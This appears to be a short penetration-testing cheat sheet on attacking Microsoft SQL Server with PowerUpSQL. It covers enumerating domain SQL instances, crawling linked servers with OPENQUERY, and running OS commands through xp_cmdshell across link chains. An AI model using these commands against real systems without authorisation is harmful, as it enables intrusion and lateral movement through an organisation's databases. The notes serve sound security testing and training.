# SQL Servers

## List accesses to database server

For this, we need the PowerupSQL module:

```powershell
> Import-Module .\PowerupSQL-master\PowerupSQL.psd1
```

```powershell
> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## Enumeration of SQL links

```powershell
> Get-SQLServerLink -Instance server.domain -Verbose
```

## Access linked databases

Through openquery in HeidiSQL:

```sql
> select * from master..sysservers
"List of IPs"
> select * from openquery("IP", 'select * from master..sysservers')
"List of DBs"
> SELECT * FROM OPENQUERY("IP", 'select * from openquery("DB", ''select @@version as version'')')
"Version of server"
```

It is also possible to use PowerUp:

```powershell
> Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
Path : {US-MSSQL}
Path : {US-MSSQL, 192.168.23.25}
Path : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
```

This shows that from US-MSSQL, it is possible to access DB server 192.168.23.25. And from this DB server, it is possible to access DB server DB-SQLSRV.

## Execute command

Execute a command on each node of the path where xp\_cmdshell is enabled:

```powershell
> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

Add `-QueryTarget DBServerName` to execute the command on only the targetted link. By default, without this parameter the command will be executed on each link.
